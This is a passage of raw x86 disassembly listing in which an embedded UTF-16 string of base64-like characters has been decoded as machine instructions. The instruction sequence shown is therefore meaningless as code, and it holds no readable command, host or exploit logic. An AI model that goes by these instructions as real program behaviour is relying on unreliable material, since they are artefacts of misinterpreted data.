  40a60f:	00 2f                	add    %ch,(%edi)
  40a611:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  40a615:	00 56 00             	add    %dl,0x0(%esi)
  40a618:	70 00                	jo     0x40a61a
  40a61a:	6c                   	insb   (%dx),%es:(%edi)
  40a61b:	00 4d 00             	add    %cl,0x0(%ebp)
  40a61e:	30 00                	xor    %al,(%eax)
  40a620:	32 00                	xor    (%eax),%al
  40a622:	57                   	push   %edi
  40a623:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40a627:	00 53 00             	add    %dl,0x0(%ebx)
  40a62a:	38 00                	cmp    %al,(%eax)
  40a62c:	57                   	push   %edi
  40a62d:	00 49 00             	add    %cl,0x0(%ecx)
  40a630:	2f                   	das
  40a631:	00 2b                	add    %ch,(%ebx)
  40a633:	00 4d 00             	add    %cl,0x0(%ebp)
  40a636:	2f                   	das
  40a637:	00 72 00             	add    %dh,0x0(%edx)
  40a63a:	33 00                	xor    (%eax),%eax
  40a63c:	4e                   	dec    %esi
  40a63d:	00 70 00             	add    %dh,0x0(%eax)
  40a640:	48                   	dec    %eax
  40a641:	00 2f                	add    %ch,(%edi)
  40a643:	00 45 00             	add    %al,0x0(%ebp)
  40a646:	57                   	push   %edi
  40a647:	00 76 00             	add    %dh,0x0(%esi)
  40a64a:	46                   	inc    %esi
  40a64b:	00 31                	add    %dh,(%ecx)
  40a64d:	00 39                	add    %bh,(%ecx)
  40a64f:	00 78 00             	add    %bh,0x0(%eax)
  40a652:	69 00 56 00 6c 00    	imul   $0x6c0056,(%eax),%eax
  40a658:	78 00                	js     0x40a65a
  40a65a:	4c                   	dec    %esp
  40a65b:	00 42 00             	add    %al,0x0(%edx)
  40a65e:	37                   	aaa
  40a65f:	00 72 00             	add    %dh,0x0(%edx)
  40a662:	36 00 67 00          	add    %ah,%ss:0x0(%edi)
  40a666:	34 00                	xor    $0x0,%al
  40a668:	73 00                	jae    0x40a66a
  40a66a:	6d                   	insl   (%dx),%es:(%edi)
  40a66b:	00 36                	add    %dh,(%esi)
  40a66d:	00 4e 00             	add    %cl,0x0(%esi)
  40a670:	63 00                	arpl   %eax,(%eax)
  40a672:	47                   	inc    %edi
  40a673:	00 53 00             	add    %dl,0x0(%ebx)
  40a676:	61                   	popa
  40a677:	00 4a 00             	add    %cl,0x0(%edx)
  40a67a:	32 00                	xor    (%eax),%al
  40a67c:	75 00                	jne    0x40a67e
  40a67e:	61                   	popa
  40a67f:	00 52 00             	add    %dl,0x0(%edx)
  40a682:	70 00                	jo     0x40a684
  40a684:	69 00 51 00 48 00    	imul   $0x480051,(%eax),%eax
  40a68a:	39 00                	cmp    %eax,(%eax)
  40a68c:	71 00                	jno    0x40a68e
  40a68e:	73 00                	jae    0x40a690
  40a690:	36 00 2f             	add    %ch,%ss:(%edi)
  40a693:	00 41 00             	add    %al,0x0(%ecx)
  40a696:	42                   	inc    %edx
  40a697:	00 55 00             	add    %dl,0x0(%ebp)
  40a69a:	53                   	push   %ebx
  40a69b:	00 70 00             	add    %dh,0x0(%eax)
  40a69e:	71 00                	jno    0x40a6a0
  40a6a0:	4d                   	dec    %ebp
  40a6a1:	00 68 00             	add    %ch,0x0(%eax)
  40a6a4:	72 00                	jb     0x40a6a6
  40a6a6:	71 00                	jno    0x40a6a8
  40a6a8:	61                   	popa
  40a6a9:	00 65 00             	add    %ah,0x0(%ebp)
  40a6ac:	43                   	inc    %ebx
  40a6ad:	00 62 00             	add    %ah,0x0(%edx)
  40a6b0:	71 00                	jno    0x40a6b2
  40a6b2:	55                   	push   %ebp
  40a6b3:	00 6f 00             	add    %ch,0x0(%edi)
  40a6b6:	47                   	inc    %edi
  40a6b7:	00 58 00             	add    %bl,0x0(%eax)
  40a6ba:	6c                   	insb   (%dx),%es:(%edi)
  40a6bb:	00 73 00             	add    %dh,0x0(%ebx)
  40a6be:	74 00                	je     0x40a6c0
  40a6c0:	63 00                	arpl   %eax,(%eax)
  40a6c2:	53                   	push   %ebx
  40a6c3:	00 2f                	add    %ch,(%edi)
  40a6c5:	00 4e 00             	add    %cl,0x0(%esi)
  40a6c8:	51                   	push   %ecx
  40a6c9:	00 46 00             	add    %al,0x0(%esi)
  40a6cc:	2b 00                	sub    (%eax),%eax
  40a6ce:	46                   	inc    %esi
  40a6cf:	00 38                	add    %bh,(%eax)
  40a6d1:	00 66 00             	add    %ah,0x0(%esi)
  40a6d4:	67 00 2b             	add    %ch,(%bp,%di)
  40a6d7:	00 4e 00             	add    %cl,0x0(%esi)
  40a6da:	67 00 2b             	add    %ch,(%bp,%di)
  40a6dd:	00 39                	add    %bh,(%ecx)
  40a6df:	00 57 00             	add    %dl,0x0(%edi)
  40a6e2:	2f                   	das
  40a6e3:	00 6d 00             	add    %ch,0x0(%ebp)
  40a6e6:	41                   	inc    %ecx
  40a6e7:	00 39                	add    %bh,(%ecx)
  40a6e9:	00 51 00             	add    %dl,0x0(%ecx)
  40a6ec:	6c                   	insb   (%dx),%es:(%edi)
  40a6ed:	00 6f 00             	add    %ch,0x0(%edi)
  40a6f0:	37                   	aaa
  40a6f1:	00 66 00             	add    %ah,0x0(%esi)
  40a6f4:	64 00 58 00          	add    %bl,%fs:0x0(%eax)
  40a6f8:	70 00                	jo     0x40a6fa
  40a6fa:	68 00 7a 00 69       	push   $0x69007a00
  40a6ff:	00 50 00             	add    %dl,0x0(%eax)
  40a702:	41                   	inc    %ecx
  40a703:	00 52 00             	add    %dl,0x0(%edx)
  40a706:	58                   	pop    %eax
  40a707:	00 70 00             	add    %dh,0x0(%eax)
  40a70a:	45                   	inc    %ebp
  40a70b:	00 69 00             	add    %ch,0x0(%ecx)
  40a70e:	42                   	inc    %edx
  40a70f:	00 66 00             	add    %ah,0x0(%esi)
  40a712:	31 00                	xor    %eax,(%eax)
  40a714:	4c                   	dec    %esp
  40a715:	00 44 00 49          	add    %al,0x49(%eax,%eax,1)
  40a719:	00 64 00 76          	add    %ah,0x76(%eax,%eax,1)
  40a71d:	00 41 00             	add    %al,0x0(%ecx)
  40a720:	6c                   	insb   (%dx),%es:(%edi)
  40a721:	00 50 00             	add    %dl,0x0(%eax)
  40a724:	52                   	push   %edx
  40a725:	00 67 00             	add    %ah,0x0(%edi)
  40a728:	43                   	inc    %ebx
  40a729:	00 2f                	add    %ch,(%edi)
  40a72b:	00 43 00             	add    %al,0x0(%ebx)
  40a72e:	41                   	inc    %ecx
  40a72f:	00 36                	add    %dh,(%esi)
  40a731:	00 71 00             	add    %dh,0x0(%ecx)
  40a734:	52                   	push   %edx
  40a735:	00 71 00             	add    %dh,0x0(%ecx)
  40a738:	73 00                	jae    0x40a73a
  40a73a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a73b:	00 36                	add    %dh,(%esi)
  40a73d:	00 2f                	add    %ch,(%edi)
  40a73f:	00 6a 00             	add    %ch,0x0(%edx)
  40a742:	6c                   	insb   (%dx),%es:(%edi)
  40a743:	00 5a 00             	add    %bl,0x0(%edx)
  40a746:	69 00 37 00 6f 00    	imul   $0x6f0037,(%eax),%eax
  40a74c:	58                   	pop    %eax
  40a74d:	00 51 00             	add    %dl,0x0(%ecx)
  40a750:	51                   	push   %ecx
  40a751:	00 45 00             	add    %al,0x0(%ebp)
  40a754:	74 00                	je     0x40a756
  40a756:	44                   	inc    %esp
  40a757:	00 47 00             	add    %al,0x0(%edi)
  40a75a:	46                   	inc    %esi
  40a75b:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
  40a75f:	00 51 00             	add    %dl,0x0(%ecx)
  40a762:	34 00                	xor    $0x0,%al
  40a764:	67 00 6b 00          	add    %ch,0x0(%bp,%di)
  40a768:	55                   	push   %ebp
  40a769:	00 6b 00             	add    %ch,0x0(%ebx)
  40a76c:	72 00                	jb     0x40a76e
  40a76e:	71 00                	jno    0x40a770
  40a770:	65 00 68 00          	add    %ch,%gs:0x0(%eax)
  40a774:	6a 00                	push   $0x0
  40a776:	4b                   	dec    %ebx
  40a777:	00 47 00             	add    %al,0x0(%edi)
  40a77a:	65 00 33             	add    %dh,%gs:(%ebx)
  40a77d:	00 61 00             	add    %ah,0x0(%ecx)
  40a780:	74 00                	je     0x40a782
  40a782:	56                   	push   %esi
  40a783:	00 66 00             	add    %ah,0x0(%esi)
  40a786:	52                   	push   %edx
  40a787:	00 75 00             	add    %dh,0x0(%ebp)
  40a78a:	41                   	inc    %ecx
  40a78b:	00 62 00             	add    %ah,0x0(%edx)
  40a78e:	55                   	push   %ebp
  40a78f:	00 55 00             	add    %dl,0x0(%ebp)
  40a792:	71 00                	jno    0x40a794
  40a794:	34 00                	xor    $0x0,%al
  40a796:	69 00 45 00 75 00    	imul   $0x750045,(%eax),%eax
  40a79c:	53                   	push   %ebx
  40a79d:	00 73 00             	add    %dh,0x0(%ebx)
  40a7a0:	38 00                	cmp    %al,(%eax)
  40a7a2:	67 00 66 00          	add    %ah,0x0(%bp)
  40a7a6:	64 00 37             	add    %dh,%fs:(%edi)
  40a7a9:	00 36                	add    %dh,(%esi)
  40a7ab:	00 74 00 56          	add    %dh,0x56(%eax,%eax,1)
  40a7af:	00 30                	add    %dh,(%eax)
  40a7b1:	00 55 00             	add    %dl,0x0(%ebp)
  40a7b4:	51                   	push   %ecx
  40a7b5:	00 62 00             	add    %ah,0x0(%edx)
  40a7b8:	70 00                	jo     0x40a7ba
  40a7ba:	47                   	inc    %edi
  40a7bb:	00 55 00             	add    %dl,0x0(%ebp)
  40a7be:	34 00                	xor    $0x0,%al
  40a7c0:	46                   	inc    %esi
  40a7c1:	00 4b 00             	add    %cl,0x0(%ebx)
  40a7c4:	50                   	push   %eax
  40a7c5:	00 75 00             	add    %dh,0x0(%ebp)
  40a7c8:	31 00                	xor    %eax,(%eax)
  40a7ca:	4c                   	dec    %esp
  40a7cb:	00 4e 00             	add    %cl,0x0(%esi)
  40a7ce:	4b                   	dec    %ebx
  40a7cf:	00 48 00             	add    %cl,0x0(%eax)
  40a7d2:	35 00 50 00 54       	xor    $0x54005000,%eax
  40a7d7:	00 4e 00             	add    %cl,0x0(%esi)
  40a7da:	71 00                	jno    0x40a7dc
  40a7dc:	70 00                	jo     0x40a7de
  40a7de:	54                   	push   %esp
  40a7df:	00 55 00             	add    %dl,0x0(%ebp)
  40a7e2:	6d                   	insl   (%dx),%es:(%edi)
  40a7e3:	00 6f 00             	add    %ch,0x0(%edi)
  40a7e6:	52                   	push   %edx
  40a7e7:	00 63 00             	add    %ah,0x0(%ebx)
  40a7ea:	55                   	push   %ebp
  40a7eb:	00 64 00 67          	add    %ah,0x67(%eax,%eax,1)
  40a7ef:	00 39                	add    %bh,(%ecx)
  40a7f1:	00 39                	add    %bh,(%ecx)
  40a7f3:	00 46 00             	add    %al,0x0(%esi)
  40a7f6:	4d                   	dec    %ebp
  40a7f7:	00 2f                	add    %ch,(%edi)
  40a7f9:	00 72 00             	add    %dh,0x0(%edx)
  40a7fc:	70 00                	jo     0x40a7fe
  40a7fe:	73 00                	jae    0x40a800
  40a800:	61                   	popa
  40a801:	00 4b 00             	add    %cl,0x0(%ebx)
  40a804:	43                   	inc    %ebx
  40a805:	00 75 00             	add    %dh,0x0(%ebp)
  40a808:	78 00                	js     0x40a80a
  40a80a:	34 00                	xor    $0x0,%al
  40a80c:	74 00                	je     0x40a80e
  40a80e:	49                   	dec    %ecx
  40a80f:	00 6e 00             	add    %ch,0x0(%esi)
  40a812:	36 00 56 00          	add    %dl,%ss:0x0(%esi)
  40a816:	49                   	dec    %ecx
  40a817:	00 2f                	add    %ch,(%edi)
  40a819:	00 37                	add    %dh,(%edi)
  40a81b:	00 6a 00             	add    %ch,0x0(%edx)
  40a81e:	73 00                	jae    0x40a820
  40a820:	67 00 65 00          	add    %ah,0x0(%di)
  40a824:	7a 00                	jp     0x40a826
  40a826:	54                   	push   %esp
  40a827:	00 73 00             	add    %dh,0x0(%ebx)
  40a82a:	67 00 7a 00          	add    %bh,0x0(%bp,%si)
  40a82e:	73 00                	jae    0x40a830
  40a830:	44                   	inc    %esp
  40a831:	00 54 00 30          	add    %dl,0x30(%eax,%eax,1)
  40a835:	00 53 00             	add    %dl,0x0(%ebx)
  40a838:	75 00                	jne    0x40a83a
  40a83a:	50                   	push   %eax
  40a83b:	00 6f 00             	add    %ch,0x0(%edi)
  40a83e:	73 00                	jae    0x40a840
  40a840:	43                   	inc    %ebx
  40a841:	00 4e 00             	add    %cl,0x0(%esi)
  40a844:	46                   	inc    %esi
  40a845:	00 38                	add    %bh,(%eax)
  40a847:	00 30                	add    %dh,(%eax)
  40a849:	00 4d 00             	add    %cl,0x0(%ebp)
  40a84c:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40a850:	70 00                	jo     0x40a852
  40a852:	67 00 4e 00          	add    %cl,0x0(%bp)
  40a856:	73 00                	jae    0x40a858
  40a858:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40a85c:	37                   	aaa
  40a85d:	00 2f                	add    %ch,(%edi)
  40a85f:	00 74 00 32          	add    %dh,0x32(%eax,%eax,1)
  40a863:	00 4e 00             	add    %cl,0x0(%esi)
  40a866:	48                   	dec    %eax
  40a867:	00 2f                	add    %ch,(%edi)
  40a869:	00 72 00             	add    %dh,0x0(%edx)
  40a86c:	62 00                	bound  %eax,(%eax)
  40a86e:	4b                   	dec    %ebx
  40a86f:	00 55 00             	add    %dl,0x0(%ebp)
  40a872:	6d                   	insl   (%dx),%es:(%edi)
  40a873:	00 33                	add    %dh,(%ebx)
  40a875:	00 54 00 4b          	add    %dl,0x4b(%eax,%eax,1)
  40a879:	00 62 00             	add    %ah,0x0(%edx)
  40a87c:	67 00 6a 00          	add    %ch,0x0(%bp,%si)
  40a880:	62 00                	bound  %eax,(%eax)
  40a882:	68 00 4d 00 61       	push   $0x61004d00
  40a887:	00 54 00 66          	add    %dl,0x66(%eax,%eax,1)
  40a88b:	00 49 00             	add    %cl,0x0(%ecx)
  40a88e:	64 00 34 00          	add    %dh,%fs:(%eax,%eax,1)
  40a892:	54                   	push   %esp
  40a893:	00 6c 00 63          	add    %ch,0x63(%eax,%eax,1)
  40a897:	00 41 00             	add    %al,0x0(%ecx)
  40a89a:	61                   	popa
  40a89b:	00 6a 00             	add    %ch,0x0(%edx)
  40a89e:	68 00 49 00 58       	push   $0x58004900
  40a8a3:	00 5a 00             	add    %bl,0x0(%edx)
  40a8a6:	30 00                	xor    %al,(%eax)
  40a8a8:	55                   	push   %ebp
  40a8a9:	00 47 00             	add    %al,0x0(%edi)
  40a8ac:	48                   	dec    %eax
  40a8ad:	00 41 00             	add    %al,0x0(%ecx)
  40a8b0:	51                   	push   %ecx
  40a8b1:	00 78 00             	add    %bh,0x0(%eax)
  40a8b4:	71 00                	jno    0x40a8b6
  40a8b6:	4d                   	dec    %ebp
  40a8b7:	00 52 00             	add    %dl,0x0(%edx)
  40a8ba:	55                   	push   %ebp
  40a8bb:	00 76 00             	add    %dh,0x0(%esi)
  40a8be:	78 00                	js     0x40a8c0
  40a8c0:	2f                   	das
  40a8c1:	00 39                	add    %bh,(%ecx)
  40a8c3:	00 6c 00 44          	add    %ch,0x44(%eax,%eax,1)
  40a8c7:	00 62 00             	add    %ah,0x0(%edx)
  40a8ca:	48                   	dec    %eax
  40a8cb:	00 51 00             	add    %dl,0x0(%ecx)
  40a8ce:	74 00                	je     0x40a8d0
  40a8d0:	73 00                	jae    0x40a8d2
  40a8d2:	4c                   	dec    %esp
  40a8d3:	00 78 00             	add    %bh,0x0(%eax)
  40a8d6:	4f                   	dec    %edi
  40a8d7:	00 63 00             	add    %ah,0x0(%ebx)
  40a8da:	56                   	push   %esi
  40a8db:	00 6f 00             	add    %ch,0x0(%edi)
  40a8de:	62 00                	bound  %eax,(%eax)
  40a8e0:	58                   	pop    %eax
  40a8e1:	00 52 00             	add    %dl,0x0(%edx)
  40a8e4:	4e                   	dec    %esi
  40a8e5:	00 6f 00             	add    %ch,0x0(%edi)
  40a8e8:	34 00                	xor    $0x0,%al
  40a8ea:	78 00                	js     0x40a8ec
  40a8ec:	41                   	inc    %ecx
  40a8ed:	00 63 00             	add    %ah,0x0(%ebx)
  40a8f0:	35 00 4f 00 7a       	xor    $0x7a004f00,%eax
  40a8f5:	00 57 00             	add    %dl,0x0(%edi)
  40a8f8:	54                   	push   %esp
  40a8f9:	00 53 00             	add    %dl,0x0(%ebx)
  40a8fc:	76 00                	jbe    0x40a8fe
  40a8fe:	30 00                	xor    %al,(%eax)
  40a900:	67 00 44 00          	add    %al,0x0(%si)
  40a904:	5a                   	pop    %edx
  40a905:	00 71 00             	add    %dh,0x0(%ecx)
  40a908:	51                   	push   %ecx
  40a909:	00 49 00             	add    %cl,0x0(%ecx)
  40a90c:	67 00 39             	add    %bh,(%bx,%di)
  40a90f:	00 4a 00             	add    %cl,0x0(%edx)
  40a912:	37                   	aaa
  40a913:	00 62 00             	add    %ah,0x0(%edx)
  40a916:	70 00                	jo     0x40a918
  40a918:	6c                   	insb   (%dx),%es:(%edi)
  40a919:	00 79 00             	add    %bh,0x0(%ecx)
  40a91c:	74 00                	je     0x40a91e
  40a91e:	4c                   	dec    %esp
  40a91f:	00 4e 00             	add    %cl,0x0(%esi)
  40a922:	54                   	push   %esp
  40a923:	00 69 00             	add    %ch,0x0(%ecx)
  40a926:	50                   	push   %eax
  40a927:	00 31                	add    %dh,(%ecx)
  40a929:	00 6b 00             	add    %ch,0x0(%ebx)
  40a92c:	71 00                	jno    0x40a92e
  40a92e:	6b 00 6a             	imul   $0x6a,(%eax),%eax
  40a931:	00 37                	add    %dh,(%edi)
  40a933:	00 65 00             	add    %ah,0x0(%ebp)
  40a936:	6b 00 34             	imul   $0x34,(%eax),%eax
  40a939:	00 49 00             	add    %cl,0x0(%ecx)
  40a93c:	45                   	inc    %ebp
  40a93d:	00 4a 00             	add    %cl,0x0(%edx)
  40a940:	66 00 4f 00          	data16 add %cl,0x0(%edi)
  40a944:	64 00 4a 00          	add    %cl,%fs:0x0(%edx)
  40a948:	2b 00                	sub    (%eax),%eax
  40a94a:	58                   	pop    %eax
  40a94b:	00 55 00             	add    %dl,0x0(%ebp)
  40a94e:	6d                   	insl   (%dx),%es:(%edi)
  40a94f:	00 7a 00             	add    %bh,0x0(%edx)
  40a952:	38 00                	cmp    %al,(%eax)
  40a954:	66 00 34 00          	data16 add %dh,(%eax,%eax,1)
  40a958:	4e                   	dec    %esi
  40a959:	00 70 00             	add    %dh,0x0(%eax)
  40a95c:	36 00 74 00 6a       	add    %dh,%ss:0x6a(%eax,%eax,1)
  40a961:	00 6b 00             	add    %ch,0x0(%ebx)
  40a964:	48                   	dec    %eax
  40a965:	00 36                	add    %dh,(%esi)
  40a967:	00 52 00             	add    %dl,0x0(%edx)
  40a96a:	71 00                	jno    0x40a96c
  40a96c:	75 00                	jne    0x40a96e
  40a96e:	31 00                	xor    %eax,(%eax)
  40a970:	79 00                	jns    0x40a972
  40a972:	77 00                	ja     0x40a974
  40a974:	4e                   	dec    %esi
  40a975:	00 6b 00             	add    %ch,0x0(%ebx)
  40a978:	72 00                	jb     0x40a97a
  40a97a:	4e                   	dec    %esi
  40a97b:	00 2f                	add    %ch,(%edi)
  40a97d:	00 45 00             	add    %al,0x0(%ebp)
  40a980:	61                   	popa
  40a981:	00 46 00             	add    %al,0x0(%esi)
  40a984:	73 00                	jae    0x40a986
  40a986:	4e                   	dec    %esi
  40a987:	00 39                	add    %bh,(%ecx)
  40a989:	00 66 00             	add    %ah,0x0(%esi)
  40a98c:	52                   	push   %edx
  40a98d:	00 36                	add    %dh,(%esi)
  40a98f:	00 67 00             	add    %ah,0x0(%edi)
  40a992:	53                   	push   %ebx
  40a993:	00 37                	add    %dh,(%edi)
  40a995:	00 33                	add    %dh,(%ebx)
  40a997:	00 66 00             	add    %ah,0x0(%esi)
  40a99a:	7a 00                	jp     0x40a99c
  40a99c:	53                   	push   %ebx
  40a99d:	00 41 00             	add    %al,0x0(%ecx)
  40a9a0:	77 00                	ja     0x40a9a2
  40a9a2:	39 00                	cmp    %eax,(%eax)
  40a9a4:	45                   	inc    %ebp
  40a9a5:	00 6d 00             	add    %ch,0x0(%ebp)
  40a9a8:	46                   	inc    %esi
  40a9a9:	00 2f                	add    %ch,(%edi)
  40a9ab:	00 4b 00             	add    %cl,0x0(%ebx)
  40a9ae:	4b                   	dec    %ebx
  40a9af:	00 2f                	add    %ch,(%edi)
  40a9b1:	00 41 00             	add    %al,0x0(%ecx)
  40a9b4:	56                   	push   %esi
  40a9b5:	00 46 00             	add    %al,0x0(%esi)
  40a9b8:	4a                   	dec    %edx
  40a9b9:	00 6f 00             	add    %ch,0x0(%edi)
  40a9bc:	52                   	push   %edx
  40a9bd:	00 2f                	add    %ch,(%edi)
  40a9bf:	00 4b 00             	add    %cl,0x0(%ebx)
  40a9c2:	71 00                	jno    0x40a9c4
  40a9c4:	33 00                	xor    (%eax),%eax
  40a9c6:	4a                   	dec    %edx
  40a9c7:	00 71 00             	add    %dh,0x0(%ecx)
  40a9ca:	4a                   	dec    %edx
  40a9cb:	00 2b                	add    %ch,(%ebx)
  40a9cd:	00 38                	add    %bh,(%eax)
  40a9cf:	00 63 00             	add    %ah,0x0(%ebx)
  40a9d2:	51                   	push   %ecx
  40a9d3:	00 32                	add    %dh,(%edx)
  40a9d5:	00 6b 00             	add    %ch,0x0(%ebx)
  40a9d8:	4a                   	dec    %edx
  40a9d9:	00 2b                	add    %ch,(%ebx)
  40a9db:	00 33                	add    %dh,(%ebx)
  40a9dd:	00 44 00 51          	add    %al,0x51(%eax,%eax,1)
  40a9e1:	00 37                	add    %dh,(%edi)
  40a9e3:	00 68 00             	add    %ch,0x0(%eax)
  40a9e6:	63 00                	arpl   %eax,(%eax)
  40a9e8:	76 00                	jbe    0x40a9ea
  40a9ea:	2b 00                	sub    (%eax),%eax
  40a9ec:	73 00                	jae    0x40a9ee
  40a9ee:	75 00                	jne    0x40a9f0
  40a9f0:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
  40a9f4:	6e                   	outsb  %ds:(%esi),(%dx)
  40a9f5:	00 31                	add    %dh,(%ecx)
  40a9f7:	00 79 00             	add    %bh,0x0(%ecx)
  40a9fa:	38 00                	cmp    %al,(%eax)
  40a9fc:	78 00                	js     0x40a9fe
  40a9fe:	45                   	inc    %ebp
  40a9ff:	00 2f                	add    %ch,(%edi)
  40aa01:	00 56 00             	add    %dl,0x0(%esi)
  40aa04:	62 00                	bound  %eax,(%eax)
  40aa06:	2f                   	das
  40aa07:	00 71 00             	add    %dh,0x0(%ecx)
  40aa0a:	54                   	push   %esp
  40aa0b:	00 72 00             	add    %dh,0x0(%edx)
  40aa0e:	2f                   	das
  40aa0f:	00 54 00 71          	add    %dl,0x71(%eax,%eax,1)
  40aa13:	00 4d 00             	add    %cl,0x0(%ebp)
  40aa16:	64 00 37             	add    %dh,%fs:(%edi)
  40aa19:	00 31                	add    %dh,(%ecx)
  40aa1b:	00 2b                	add    %ch,(%ebx)
  40aa1d:	00 6a 00             	add    %ch,0x0(%edx)
  40aa20:	7a 00                	jp     0x40aa22
  40aa22:	67 00 79 00          	add    %bh,0x0(%bx,%di)
  40aa26:	71 00                	jno    0x40aa28
  40aa28:	33 00                	xor    (%eax),%eax
  40aa2a:	4f                   	dec    %edi
  40aa2b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aa2e:	56                   	push   %esi
  40aa2f:	00 50 00             	add    %dl,0x0(%eax)
  40aa32:	39 00                	cmp    %eax,(%eax)
  40aa34:	36 00 67 00          	add    %ah,%ss:0x0(%edi)
  40aa38:	6c                   	insb   (%dx),%es:(%edi)
  40aa39:	00 4c 00 58          	add    %cl,0x58(%eax,%eax,1)
  40aa3d:	00 57 00             	add    %dl,0x0(%edi)
  40aa40:	66 00 42 00          	data16 add %al,0x0(%edx)
  40aa44:	55                   	push   %ebp
  40aa45:	00 6d 00             	add    %ch,0x0(%ebp)
  40aa48:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
  40aa4c:	36 00 6a 00          	add    %ch,%ss:0x0(%edx)
  40aa50:	4e                   	dec    %esi
  40aa51:	00 32                	add    %dh,(%edx)
  40aa53:	00 70 00             	add    %dh,0x0(%eax)
  40aa56:	39 00                	cmp    %eax,(%eax)
  40aa58:	31 00                	xor    %eax,(%eax)
  40aa5a:	58                   	pop    %eax
  40aa5b:	00 33                	add    %dh,(%ebx)
  40aa5d:	00 4c 00 49          	add    %cl,0x49(%eax,%eax,1)
  40aa61:	00 39                	add    %bh,(%ecx)
  40aa63:	00 64 00 6a          	add    %ah,0x6a(%eax,%eax,1)
  40aa67:	00 79 00             	add    %bh,0x0(%ecx)
  40aa6a:	51                   	push   %ecx
  40aa6b:	00 77 00             	add    %dh,0x0(%edi)
  40aa6e:	52                   	push   %edx
  40aa6f:	00 6e 00             	add    %ch,0x0(%esi)
  40aa72:	6b 00 6c             	imul   $0x6c,(%eax),%eax
  40aa75:	00 4b 00             	add    %cl,0x0(%ebx)
  40aa78:	39 00                	cmp    %eax,(%eax)
  40aa7a:	35 00 31 00 6f       	xor    $0x6f003100,%eax
  40aa7f:	00 49 00             	add    %cl,0x0(%ecx)
  40aa82:	63 00                	arpl   %eax,(%eax)
  40aa84:	61                   	popa
  40aa85:	00 4b 00             	add    %cl,0x0(%ebx)
  40aa88:	57                   	push   %edi
  40aa89:	00 52 00             	add    %dl,0x0(%edx)
  40aa8c:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa8d:	00 36                	add    %dh,(%esi)
  40aa8f:	00 63 00             	add    %ah,0x0(%ebx)
  40aa92:	6d                   	insl   (%dx),%es:(%edi)
  40aa93:	00 32                	add    %dh,(%edx)
  40aa95:	00 4c 00 67          	add    %cl,0x67(%eax,%eax,1)
  40aa99:	00 49 00             	add    %cl,0x0(%ecx)
  40aa9c:	73 00                	jae    0x40aa9e
  40aa9e:	63 00                	arpl   %eax,(%eax)
  40aaa0:	44                   	inc    %esp
  40aaa1:	00 39                	add    %bh,(%ecx)
  40aaa3:	00 51 00             	add    %dl,0x0(%ecx)
  40aaa6:	38 00                	cmp    %al,(%eax)
  40aaa8:	5a                   	pop    %edx
  40aaa9:	00 39                	add    %bh,(%ecx)
  40aaab:	00 58 00             	add    %bl,0x0(%eax)
  40aaae:	79 00                	jns    0x40aab0
  40aab0:	38 00                	cmp    %al,(%eax)
  40aab2:	66 00 63 00          	data16 add %ah,0x0(%ebx)
  40aab6:	43                   	inc    %ebx
  40aab7:	00 35 00 71 00 50    	add    %dh,0x50007100
  40aabd:	00 53 00             	add    %dl,0x0(%ebx)
  40aac0:	36 00 58 00          	add    %bl,%ss:0x0(%eax)
  40aac4:	39 00                	cmp    %eax,(%eax)
  40aac6:	62 00                	bound  %eax,(%eax)
  40aac8:	57                   	push   %edi
  40aac9:	00 6a 00             	add    %ch,0x0(%edx)
  40aacc:	45                   	inc    %ebp
  40aacd:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  40aad1:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  40aad5:	00 33                	add    %dh,(%ebx)
  40aad7:	00 32                	add    %dh,(%edx)
  40aad9:	00 67 00             	add    %ah,0x0(%edi)
  40aadc:	6b 00 32             	imul   $0x32,(%eax),%eax
  40aadf:	00 2f                	add    %ch,(%edi)
  40aae1:	00 43 00             	add    %al,0x0(%ebx)
  40aae4:	31 00                	xor    %eax,(%eax)
  40aae6:	51                   	push   %ecx
  40aae7:	00 6c 00 6b          	add    %ch,0x6b(%eax,%eax,1)
  40aaeb:	00 32                	add    %dh,(%edx)
  40aaed:	00 6d 00             	add    %ch,0x0(%ebp)
  40aaf0:	48                   	dec    %eax
  40aaf1:	00 33                	add    %dh,(%ebx)
  40aaf3:	00 67 00             	add    %ah,0x0(%edi)
  40aaf6:	55                   	push   %ebp
  40aaf7:	00 50 00             	add    %dl,0x0(%eax)
  40aafa:	41                   	inc    %ecx
  40aafb:	00 30                	add    %dh,(%eax)
  40aafd:	00 71 00             	add    %dh,0x0(%ecx)
  40ab00:	77 00                	ja     0x40ab02
  40ab02:	45                   	inc    %ebp
  40ab03:	00 38                	add    %bh,(%eax)
  40ab05:	00 69 00             	add    %ch,0x0(%ecx)
  40ab08:	59                   	pop    %ecx
  40ab09:	00 6c 00 50          	add    %ch,0x50(%eax,%eax,1)
  40ab0d:	00 57 00             	add    %dl,0x0(%edi)
  40ab10:	46                   	inc    %esi
  40ab11:	00 36                	add    %dh,(%esi)
  40ab13:	00 68 00             	add    %ch,0x0(%eax)
  40ab16:	2b 00                	sub    (%eax),%eax
  40ab18:	48                   	dec    %eax
  40ab19:	00 4f 00             	add    %cl,0x0(%edi)
  40ab1c:	54                   	push   %esp
  40ab1d:	00 75 00             	add    %dh,0x0(%ebp)
  40ab20:	37                   	aaa
  40ab21:	00 5a 00             	add    %bl,0x0(%edx)
  40ab24:	50                   	push   %eax
  40ab25:	00 6f 00             	add    %ch,0x0(%edi)
  40ab28:	54                   	push   %esp
  40ab29:	00 38                	add    %bh,(%eax)
  40ab2b:	00 45 00             	add    %al,0x0(%ebp)
  40ab2e:	2f                   	das
  40ab2f:	00 67 00             	add    %ah,0x0(%edi)
  40ab32:	30 00                	xor    %al,(%eax)
  40ab34:	32 00                	xor    (%eax),%al
  40ab36:	69 00 7a 00 4d 00    	imul   $0x4d007a,(%eax),%eax
  40ab3c:	54                   	push   %esp
  40ab3d:	00 52 00             	add    %dl,0x0(%edx)
  40ab40:	73 00                	jae    0x40ab42
  40ab42:	2f                   	das
  40ab43:	00 30                	add    %dh,(%eax)
  40ab45:	00 67 00             	add    %ah,0x0(%edi)
  40ab48:	44                   	inc    %esp
